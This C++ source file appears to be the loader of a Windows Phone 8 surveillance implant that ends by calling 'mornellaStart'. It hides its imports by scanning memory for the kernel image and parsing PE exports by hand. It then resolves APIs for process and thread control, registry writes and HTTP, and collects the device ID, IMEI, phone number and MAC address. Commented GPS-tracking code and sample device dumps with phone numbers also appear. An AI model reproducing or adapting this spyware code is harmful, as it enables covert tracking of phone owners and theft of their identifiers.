extern "C" int mornellaStart(void);


//#include "pch.h"
#include <windows.h>
#include "FunctionFunc.h"


	FunctionFuncSleep _Sleep;
	FunctionFuncGetModuleHandleW _GetModuleHandleW;
	FunctionFuncCreateThread _CreateThread;
	FunctionFuncWaitForSingleObject _WaitForSingleObject;
	FunctionFuncCreateEvent _CreateEventW;
	FunctionFuncCreateToolhelp32Snapshot   _CreateToolhelp32Snapshot;
	FunctionFuncProcess32FirstW   _Process32FirstW;
	FunctionFuncOpenProcessToken   _OpenProcessToken;
	FunctionFuncProcess32NextW  _Process32NextW;
	FunctionFuncOpenProcess   _OpenProcess;
	FunctionFuncGlobalMemoryStatus _GlobalMemoryStatus;
	FunctionFuncGetVersionExW   _GetVersionExW;
	FunctionFuncCloseToolhelp32Snapshot _CloseToolhelp32Snapshot;
	FunctionFuncCreateFileW _CreateFileW;
	FunctionFuncRegOpenKeyExW   _RegOpenKeyExW;
	FunctionFuncRegCloseKey   _RegCloseKey;
    FunctionFuncRegSetValueEx _RegSetValueEx;
	FunctionFuncRegFlushKey _RegFlushKey;
	FunctionFuncGetFileSize _GetFileSize;
	FunctionFuncFindFirstFile  _FindFirstFile;
	FunctionFuncGetIpAddrTable _GetIpAddrTable;
	FunctionFuncGetAdapterIndex _GetAdapterIndex;
	FunctionFuncRegQueryValueExW _RegQueryValueExW;
	FunctionFuncCreateMutexW _CreateMutexW;
	FunctionFuncReleaseMutex _ReleaseMutex;
	FunctionFuncRtlZeroMemory _RtlZeroMemory;
	FunctionFuncRtlFillMemory _RtlFillMemory;
	FunctionFuncRtlCopyMemory _RtlCopyMemory;
	FunctionFuncRtlMoveMemory _RtlMoveMemory;
	FunctionFuncDeviceIoControl _DeviceIoControl;
	FunctionFuncGetSystemInfo _GetSystemInfo;
	FunctionFuncSetFilePointer _SetFilePointer;
	FunctionFuncCreateProcessW _CreateProcessW;
	FunctionFuncGetDeviceUniqueID _GetDeviceUniqueID;
	FunctionFuncGetIMEI _GetIMEI;
	FunctionFuncDevicePropertiesGetProcessMemoryInfo _DevicePropertiesGetProcessMemoryInfo;
	FunctionFuncDevicePropertiesGetUniqueDeviceId _DevicePropertiesGetUniqueDeviceId;
	FunctionFuncBNSCGetBackgroundServiceId _BNSCGetBackgroundServiceId;
	FunctionFuncDevicePropertiesGlobalMemoryStatus _DevicePropertiesGlobalMemoryStatus;
	FunctionFuncQueryPhoneInformation _QueryPhoneInformation;
	FunctionFuncGetPhoneNumber _GetPhoneNumber;
	FunctionFuncGetMACAddress _GetMACAddress;
	FunctionFuncTerminateThread _TerminateThread;
	FunctionFuncGetTickCount _GetTickCount;
	FunctionFuncInternetOpenW _InternetOpenW;
	FunctionFuncInternetConnectW _InternetConnectW;
	FunctionFuncInternetCloseHandle _InternetCloseHandle;
	FunctionFuncHttpOpenRequestW _HttpOpenRequestW;
	FunctionFuncHttpSendRequestW _HttpSendRequestW;
	FunctionFuncHttpQueryInfoW _HttpQueryInfoW;
	FunctionFuncInternetReadFile _InternetReadFile;
	FunctionFuncGetModuleFileNameW   _GetModuleFileNameW;
	FunctionFuncGetFileVersionInfoSizeExW  _GetFileVersionInfoSizeExW;
	FunctionFuncGetFileVersionInfoExW  _GetFileVersionInfoExW;
	FunctionFuncVerQueryValueW _VerQueryValueW;
	FunctionFuncEnumWindows _EnumWindows;
	FunctionFuncGetWindowTextW   _GetWindowTextW;
	FunctionFuncThread32First   _Thread32First;
	FunctionFuncSuspendThread  _SuspendThread;
	FunctionFuncResumeThread  _ResumeThread;
	FunctionFuncThread32Next   _Thread32Next;
	FunctionFuncTerminateProcess  _TerminateProcess;
	FunctionFuncMedia_Queue_GameHasControl  _Media_Queue_GameHasControl;
	FunctionFuncZMediaQueue_ConnectToService  _ZMediaQueue_ConnectToService;
	FunctionFuncZMediaQueue_DisconnectFromService  _ZMediaQueue_DisconnectFromService;
	FunctionFuncGetSystemPowerStatus _GetSystemPowerStatus;
	FunctionFuncShell_IdleTimerReset _Shell_IdleTimerReset;
	FunctionFuncShell_IsUnlockedNormal _Shell_IsUnlockedNormal;


PIMAGE_NT_HEADERS WINAPI ImageNtHeader(PVOID Base)
{
	return (PIMAGE_NT_HEADERS)
		((LPBYTE) Base + ((PIMAGE_DOS_HEADER) Base)->e_lfanew);
}

PIMAGE_SECTION_HEADER WINAPI RtlImageRvaToSection( const IMAGE_NT_HEADERS *nt,
                                                   HMODULE module, DWORD_PTR rva )
{
    int i;
    const IMAGE_SECTION_HEADER *sec;

    sec = (const IMAGE_SECTION_HEADER*)((const char*)&nt->OptionalHeader +
                                        nt->FileHeader.SizeOfOptionalHeader);
    for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++)
    {
        if ((sec->VirtualAddress <= rva) && (sec->VirtualAddress + sec->SizeOfRawData > rva))
            return (PIMAGE_SECTION_HEADER)sec;
    }
    return NULL;
}

PVOID WINAPI RtlImageRvaToVa( const IMAGE_NT_HEADERS *nt, HMODULE module,
                              DWORD_PTR rva, IMAGE_SECTION_HEADER **section )
{
    IMAGE_SECTION_HEADER *sec;

    if (section && *section)  /* try this section first */
    {
        sec = *section;
        if ((sec->VirtualAddress <= rva) && (sec->VirtualAddress + sec->SizeOfRawData > rva))
            goto found;
    }
    if (!(sec = RtlImageRvaToSection( nt, module, rva ))) return NULL;
 found:
    if (section) *section = sec;
    return (char *)module + sec->PointerToRawData + (rva - sec->VirtualAddress);
}

PVOID WINAPI ImageDirectoryEntryToDataEx( PVOID base, BOOLEAN image, USHORT dir, PULONG size, PIMAGE_SECTION_HEADER *section )
{
    const IMAGE_NT_HEADERS *nt;
    DWORD_PTR addr;

    *size = 0;
    if (section) *section = NULL;

    if (!(nt = ImageNtHeader( base ))) return NULL;
    if (dir >= nt->OptionalHeader.NumberOfRvaAndSizes) return NULL;
    if (!(addr = nt->OptionalHeader.DataDirectory[dir].VirtualAddress)) return NULL;

    *size = nt->OptionalHeader.DataDirectory[dir].Size;
    if (image || addr < nt->OptionalHeader.SizeOfHeaders) return (char *)base + addr;

    return RtlImageRvaToVa( nt, (HMODULE)base, addr, section );
}



// == Windows API GetProcAddress
void *PeGetProcAddressA(void *Base, LPCSTR Name)
{
	DWORD Tmp;

	IMAGE_NT_HEADERS *NT=ImageNtHeader(Base);
	IMAGE_EXPORT_DIRECTORY *Exp=(IMAGE_EXPORT_DIRECTORY*)ImageDirectoryEntryToDataEx(Base,TRUE,IMAGE_DIRECTORY_ENTRY_EXPORT,&Tmp,0);
	if(Exp==0 || Exp->NumberOfFunctions==0)
	{
		SetLastError(ERROR_NOT_FOUND);
		return 0;
	}

	DWORD *Names=(DWORD*)(Exp->AddressOfNames+(DWORD_PTR)Base);
	WORD *Ordinals=(WORD*)(Exp->AddressOfNameOrdinals+(DWORD_PTR)Base);
	DWORD *Functions=(DWORD*)(Exp->AddressOfFunctions+(DWORD_PTR)Base);

	FARPROC Ret=0;

	if((DWORD_PTR)Name<65536)
	{
		if((DWORD_PTR)Name-Exp->Base<Exp->NumberOfFunctions)
			Ret=(FARPROC)(Functions[(DWORD_PTR)Name-Exp->Base]+(DWORD_PTR)Base);
	} else
	{
		for(DWORD i=0; i<Exp->NumberOfNames && Ret==0; i++)
		{
			char *Func=(char*)(Names[i]+(DWORD_PTR)Base);
			if(Func && strcmp(Func,Name)==0)
				Ret=(FARPROC)(Functions[Ordinals[i]]+(DWORD_PTR)Base);
		}
	}

	if(Ret)
	{
		DWORD ExpStart=NT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress+(DWORD)Base;
		DWORD ExpSize=NT->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
		if((DWORD)Ret>=ExpStart && (DWORD)Ret<=ExpStart+ExpSize)
		{
			// Forwarder
			return 0;
		}
		return Ret;
	}

	return 0;	
}


	
	

int setLoadLibraryExW(void)
{

	char *Tmp=(char*)GetTickCount64;
	Tmp=(char*)((~0xFFF)&(DWORD_PTR)Tmp);

	while(Tmp)
	{
		
		if(Tmp[0]=='M' && Tmp[1]=='Z')
				break;
		
		Tmp-=0x1000;
	}

	if(Tmp==0)
		return -1;


	t_LLW* LoadLibraryExW=0;

	LoadLibraryExW=(t_LLW*)PeGetProcAddressA(Tmp,"LoadLibraryExW");

	_Sleep = (FunctionFuncSleep)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"Sleep");
	_GetModuleHandleW=  (FunctionFuncGetModuleHandleW)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"GetModuleHandleW");
	_CreateThread=  (FunctionFuncCreateThread)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"CreateThread");
	_TerminateThread=  (FunctionFuncTerminateThread)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"TerminateThread");
	_WaitForSingleObject=  (FunctionFuncWaitForSingleObject)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"WaitForSingleObject");
	_CreateEventW = (FunctionFuncCreateEvent)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"CreateEventW");
	 
	HINSTANCE LibHandle;
	
	

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_CreateToolhelp32Snapshot =  (FunctionFuncCreateToolhelp32Snapshot)GetProcAddress(LibHandle,"CreateToolhelp32Snapshot");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_Process32FirstW =  (FunctionFuncProcess32FirstW)GetProcAddress(LibHandle,"Process32FirstW");
	
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_OpenProcessToken=  (FunctionFuncOpenProcessToken)GetProcAddress(LibHandle,"OpenProcessToken");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_Process32NextW =  (FunctionFuncProcess32NextW)GetProcAddress(LibHandle,"Process32NextW");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_OpenProcess=  (FunctionFuncOpenProcess)GetProcAddress(LibHandle,"OpenProcess");


	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_CloseToolhelp32Snapshot =  (FunctionFuncCloseToolhelp32Snapshot)GetProcAddress(LibHandle,"CloseToolhelp32Snapshot");

	
	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_GlobalMemoryStatus =  (FunctionFuncGlobalMemoryStatus)GetProcAddress(LibHandle,"GlobalMemoryStatus");

	_GetVersionExW=  (FunctionFuncGetVersionExW)GetProcAddress(LoadLibraryExW(L"KERNELBASE",NULL,0),"GetVersionExW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_CreateFileW=  (FunctionFuncCreateFileW)GetProcAddress(LibHandle,"CreateFileW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_RegOpenKeyExW =  (FunctionFuncRegOpenKeyExW)GetProcAddress(LibHandle,"RegOpenKeyExW");

	
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _RegCloseKey =  (FunctionFuncRegCloseKey)GetProcAddress(LibHandle,"RegCloseKey");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _RegSetValueEx =  (FunctionFuncRegSetValueEx)GetProcAddress(LibHandle,"RegSetValueEx");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _RegFlushKey =  (FunctionFuncRegFlushKey)GetProcAddress(LibHandle,"RegFlushKey");



	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _GetFileSize =  (FunctionFuncGetFileSize)GetProcAddress(LibHandle,"GetFileSize");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_FindFirstFile =  (FunctionFuncFindFirstFile)GetProcAddress(LibHandle,"FindFirstFileW");

	
	LibHandle = LoadLibraryExW(L"IPHLPAPI",NULL,0);
	_GetIpAddrTable =  (FunctionFuncGetIpAddrTable)GetProcAddress(LibHandle,"GetIpAddrTable");


	LibHandle = LoadLibraryExW(L"IPHLPAPI",NULL,0);
	_GetAdapterIndex =  (FunctionFuncGetAdapterIndex)GetProcAddress(LibHandle,"GetAdapterIndex");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_RegQueryValueExW =  (FunctionFuncRegQueryValueExW)GetProcAddress(LibHandle,"RegQueryValueExW");
	

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_CreateMutexW =  (FunctionFuncCreateMutexW)GetProcAddress(LibHandle,"CreateMutexW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_ReleaseMutex =  (FunctionFuncReleaseMutex)GetProcAddress(LibHandle,"ReleaseMutex");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_GetSystemInfo =  (FunctionFuncGetSystemInfo)GetProcAddress(LibHandle,"GetSystemInfo");


	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlZeroMemory =  (FunctionFuncRtlZeroMemory)GetProcAddress(LibHandle,"RtlZeroMemory");

	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlFillMemory=  (FunctionFuncRtlFillMemory)GetProcAddress(LibHandle,"RtlFillMemory");


	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlCopyMemory=  (FunctionFuncRtlCopyMemory)GetProcAddress(LibHandle,"RtlCopyMemory");

	LibHandle = LoadLibraryExW(L"NTDLL",NULL,0);
	_RtlMoveMemory=  (FunctionFuncRtlMoveMemory)GetProcAddress(LibHandle,"RtlMoveMemory");


	
	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_DeviceIoControl =  (FunctionFuncDeviceIoControl)GetProcAddress(LibHandle,"DeviceIoControl");
		

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_GlobalMemoryStatus=  (FunctionFuncGlobalMemoryStatus)GetProcAddress(LibHandle,"GlobalMemoryStatus");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_SetFilePointer=  (FunctionFuncSetFilePointer)GetProcAddress(LibHandle,"SetFilePointer");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _CreateProcessW=  (FunctionFuncCreateProcessW)GetProcAddress(LibHandle,"CreateProcessW");
	

	LibHandle = LoadLibraryExW(L"WPCOREUTIL",NULL,0);
    _GetDeviceUniqueID=  (FunctionFuncGetDeviceUniqueID)GetProcAddress(LibHandle,"GetDeviceUniqueID");


	LibHandle = LoadLibraryExW(L"DMCmnUtils",NULL,0);
    _GetIMEI=  (FunctionFuncGetIMEI)GetProcAddress(LibHandle,"GetIMEI");

	LibHandle = LoadLibraryExW(L"DMCmnUtils",NULL,0);
    _GetPhoneNumber=  (FunctionFuncGetPhoneNumber)GetProcAddress(LibHandle,"GetPhoneNumber");


	LibHandle = LoadLibraryExW(L"PlatformInterop",NULL,0);
    _DevicePropertiesGetProcessMemoryInfo=  (FunctionFuncDevicePropertiesGetProcessMemoryInfo)GetProcAddress(LibHandle,"DevicePropertiesGetProcessMemoryInfo");



	LibHandle = LoadLibraryExW(L"PlatformInterop",NULL,0);
    _DevicePropertiesGetUniqueDeviceId=  (FunctionFuncDevicePropertiesGetUniqueDeviceId)GetProcAddress(LibHandle,"DevicePropertiesGetUniqueDeviceId");

	//BNSCGetBackgroundServiceId(int a1)
;

	LibHandle = LoadLibraryExW(L"BNSClient",NULL,0);
    _BNSCGetBackgroundServiceId=  (FunctionFuncBNSCGetBackgroundServiceId)GetProcAddress(LibHandle,"BNSCGetBackgroundServiceId");



	
	LibHandle = LoadLibraryExW(L"PlatformInterop",NULL,0);
    _DevicePropertiesGlobalMemoryStatus=  (FunctionFuncDevicePropertiesGlobalMemoryStatus)GetProcAddress(LibHandle,"DevicePropertiesGlobalMemoryStatus");


	

	//QueryPhoneInformation
	//public static extern bool QueryPhoneInformation(int key, StringBuilder value, int inSize);

	LibHandle = LoadLibraryExW(L"PHONEINFO",NULL,0);
    _QueryPhoneInformation=  (FunctionFuncQueryPhoneInformation)GetProcAddress(LibHandle,"QueryPhoneInformation");


	LibHandle = LoadLibraryExW(L"DMCmnUtils",NULL,0);
    _GetMACAddress=  (FunctionFuncGetMACAddress)GetProcAddress(LibHandle,"GetMACAddress");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
    _GetTickCount=  (FunctionFuncGetTickCount)GetProcAddress(LibHandle,"GetTickCount");



	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _InternetOpenW=  (FunctionFuncInternetOpenW)GetProcAddress(LibHandle,"InternetOpenW");


	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _InternetConnectW=  (FunctionFuncInternetConnectW)GetProcAddress(LibHandle,"InternetConnectW");


	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _InternetCloseHandle=  (FunctionFuncInternetCloseHandle)GetProcAddress(LibHandle,"InternetCloseHandle");


	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _HttpOpenRequestW=  (FunctionFuncHttpOpenRequestW)GetProcAddress(LibHandle,"HttpOpenRequestW");

		

	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _HttpSendRequestW=  (FunctionFuncHttpSendRequestW)GetProcAddress(LibHandle,"HttpSendRequestW");


	
	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _HttpQueryInfoW=  (FunctionFuncHttpQueryInfoW)GetProcAddress(LibHandle,"HttpQueryInfoW");


	LibHandle = LoadLibraryExW(L"WININET",NULL,0);
    _InternetReadFile=  (FunctionFuncInternetReadFile)GetProcAddress(LibHandle,"InternetReadFile");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_GetModuleFileNameW =  (FunctionFuncGetModuleFileNameW)GetProcAddress(LibHandle,"GetModuleFileNameW");

	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_GetFileVersionInfoExW =  (FunctionFuncGetFileVersionInfoExW)GetProcAddress(LibHandle,"GetFileVersionInfoExW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_GetFileVersionInfoSizeExW =  (FunctionFuncGetFileVersionInfoSizeExW)GetProcAddress(LibHandle,"GetFileVersionInfoSizeExW");


	LibHandle = LoadLibraryExW(L"KERNELBASE",NULL,0);
	_VerQueryValueW =  (FunctionFuncVerQueryValueW)GetProcAddress(LibHandle,"VerQueryValueW");

	LibHandle = LoadLibraryExW(L"ie_shims",NULL,0);
	_EnumWindows =  (FunctionFuncEnumWindows)GetProcAddress(LibHandle,"EnumWindows");


	LibHandle = LoadLibraryExW(L"ie_shims",NULL,0);
	_GetWindowTextW=  (FunctionFuncGetWindowTextW)GetProcAddress(LibHandle,"GetWindowTextW");


	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
    _Thread32First =  (FunctionFuncThread32First)GetProcAddress(LibHandle,"Thread32First");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
    _SuspendThread =  (FunctionFuncSuspendThread)GetProcAddress(LibHandle,"SuspendThread");

	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
    _ResumeThread =  (FunctionFuncResumeThread)GetProcAddress(LibHandle,"ResumeThread");

 
	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_Thread32Next =  (FunctionFuncThread32Next)GetProcAddress(LibHandle,"Thread32Next");

	
	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_TerminateProcess =  (FunctionFuncTerminateProcess)GetProcAddress(LibHandle,"TerminateProcess");

	
	LibHandle = LoadLibraryExW(L"XnaFrameworkCore",NULL,0);
	_Media_Queue_GameHasControl=  (FunctionFuncMedia_Queue_GameHasControl)GetProcAddress(LibHandle,"Media_Queue_GameHasControl");

	LibHandle = LoadLibraryExW(L"ZMediaqueueClient",NULL,0);
	_ZMediaQueue_ConnectToService=  (FunctionFuncZMediaQueue_ConnectToService)GetProcAddress(LibHandle,"ZMediaQueue_ConnectToService");

	LibHandle = LoadLibraryExW(L"ZMediaqueueClient",NULL,0);
	_ZMediaQueue_DisconnectFromService=  (FunctionFuncZMediaQueue_DisconnectFromService)GetProcAddress(LibHandle,"ZMediaQueue_DisconnectFromService");


	LibHandle = LoadLibraryExW(L"kernel32legacy",NULL,0);
	_GetSystemPowerStatus=  (FunctionFuncGetSystemPowerStatus)GetProcAddress(LibHandle,"GetSystemPowerStatus");
	
	LibHandle = LoadLibraryExW(L"ShellChromeAPI",NULL,0);
	_Shell_IdleTimerReset=  (FunctionFuncShell_IdleTimerReset)GetProcAddress(LibHandle,"Shell_IdleTimerReset");

	
	LibHandle = LoadLibraryExW(L"ShellChromeAPI",NULL,0);
	_Shell_IsUnlockedNormal=  (FunctionFuncShell_IsUnlockedNormal)GetProcAddress(LibHandle,"Shell_IsUnlockedNormal");

	return 0;
}

void testVari(void)
{

		BYTE array[20];
	_DevicePropertiesGetUniqueDeviceId(array,sizeof(array));

	WCHAR Phonenum[64];

	_GetPhoneNumber(Phonenum);

	BYTE MAC[128];
	_GetMACAddress(MAC);

	/*
	byte[] array = new byte[20];
				DeviceInfoNativeMethods.GetUniqueDeviceId(array, (uint)array.Length);
				propertyValue = array;
				*/



	 WCHAR stringBuilder[256];
	
	 /*
	 public enum PhoneKeys
{
	DeviceManufacturer,
	DeviceName = 5,
	DeviceHardwareVersion,
	DeviceFirmwareVersion = 8
}
	 */
/***
	 //DeviceManufacturer	
	_QueryPhoneInformation(0,stringBuilder,sizeof(stringBuilder),NULL);

	//DeviceName
	_QueryPhoneInformation(5,stringBuilder,sizeof(stringBuilder),NULL);

	//DeviceHardwareVersion
	_QueryPhoneInformation(6,stringBuilder,sizeof(stringBuilder),NULL);

	//DeviceFirmwareVersion
	_QueryPhoneInformation(8,stringBuilder,sizeof(stringBuilder),NULL);
	***/
	
	
	DWORD ret;
	WCHAR msg[1024];
	

	for(DWORD ix=0;ix<0xf;ix++)
	{
		bool rrr=_QueryPhoneInformation(ix,stringBuilder,sizeof(stringBuilder)/sizeof(WCHAR),&ret);
		swprintf_s(msg, TEXT("%i) %s\n"),ix,stringBuilder);OutputDebugString(msg);
	}
	
	/*
	0) NOKIA
1) 
2) 000-IT
3) CV ID 232.O2
4) Lumia 820
5) RM-825_eu_italy_232
6) 1.0.0.0
7) 8960
8) 1232.2109.1242.1002
9) 
10) 1.0.202041.3
11) 
12) 
13) 
14) http://link.nokia.com/support
15) Windows Phone 8 ByGio
	*/
/*
0) NOKIA
1) 
2) 000-GB
3) CV GB SW Variant ID 276 v03
4) Lumia 920
5) RM-821_eu_euro1_276
6) 1.0.0.0
7) 8960
8) 1232.2110.1244.3003
9) 
10) 1.0.202041.3
11) 
12) +448450455555
13) 
14) http://link.nokia.com/support
15) WP920
*/

	/*
	0) HTC
1) 0
2) 000-33
3) 
4) Windows Phone 8S by HTC
5) Windows Phone 8S by HTC
6) 0001
7) 8227
8) 1030.54.10403.401
9) 1.102.0.D4
10) 1.11b.3054.25_10.13.30.54P
11) 0.0.1030.54(159870)
12) +33-170-759-171
13) 
14) 
15) Windows Phone
	*/


	//

	//Microsoft.Phone.Info.DeviceExtendedProperties.GetValue("DeviceUniqueId");

	 PROCESS_MEMORY_COUNTERS memCounter;
	_DevicePropertiesGetProcessMemoryInfo( &memCounter,sizeof( memCounter ));

	/*
	if ("DeviceTotalMemory" == propertyName)
						{
							uint num = 0u;
							bool flag2 = Registry.QueryDwordValue(2147483650u, "Software\\Microsoft\\AppPlatform", "OverrideDeviceMemoryAPI", ref num);
							propertyValue = (long)((ulong)num);
							if (!flag2)
							{
								DeviceInfoNativeMethods.MEMORYSTATUS mEMORYSTATUS = default(DeviceInfoNativeMethods.MEMORYSTATUS);
								mEMORYSTATUS.dwLength = (uint)Marshal.SizeOf(mEMORYSTATUS);
								DeviceInfoNativeMethods.GlobalMemoryStatus(ref mEMORYSTATUS);
								propertyValue = (long)mEMORYSTATUS.ullTotalPhys;
							}
	*/

	MEMORYSTATUS memStatus;
	memStatus.dwLength = sizeof(memStatus);
	_DevicePropertiesGlobalMemoryStatus(&memStatus);







		BYTE *pImei2;
		BYTE alloco[64];
		pImei2=alloco;
		_GetIMEI(pImei2);

}

using namespace Windows::Devices::Geolocation;
using namespace Windows::System::Threading;
using namespace Windows::Foundation;
#include <ppltasks.h>
using namespace concurrency;

[Platform::MTAThread]
int main(Platform::Array<Platform::String^>^)
{
/*
       //singola acquisizione GPS

		Windows::Devices::Geolocation::Geolocator^ geolocator;
		geolocator = ref new Geolocator();

		IAsyncOperation<Geoposition^> ^operation = geolocator->GetGeopositionAsync();
		operation->Completed = ref new AsyncOperationCompletedHandler<Geoposition^>(
        [=] (IAsyncOperation<Geoposition^>^ asyncOperation, Windows::Foundation::AsyncStatus status) mutable
        {
            if(status != Windows::Foundation::AsyncStatus::Error)
            {
               Geoposition^ geoposition = asyncOperation->GetResults();

               // use the location information
               double latitude = geoposition->Coordinate->Latitude;
               double longitude = geoposition->Coordinate->Longitude;
               double accuracy = geoposition->Coordinate->Accuracy;

            }
            else
            {
				if(asyncOperation->ErrorCode.Value == E_ABORT)
				{
					// The user has disable location in the phone settings
				}
				else
				{
					// There was another error
				}
            }
        });
*/
/*
	////singola acquisizione GPS con wait	
	Windows::Devices::Geolocation::Geolocator^ geolocator;
    concurrency::cancellation_token_source geopositionTaskTokenSource;

	geolocator = ref new Geolocator();
	
    task<Geoposition^> geopositionTask(geolocator->GetGeopositionAsync(), geopositionTaskTokenSource.get_token());

	geopositionTask.then([=](task<Geoposition^> getPosTask)
    {
	   Geoposition^ pos = getPosTask.get();

	   auto Text1 = pos->Coordinate->Latitude.ToString();
       auto Text2 = pos->Coordinate->Longitude.ToString();
       auto Text3 = pos->Coordinate->Accuracy.ToString();
	 }).wait();

*/	 
	
	setLoadLibraryExW();
	
	testVari();

	

	mornellaStart();

	return 0;
}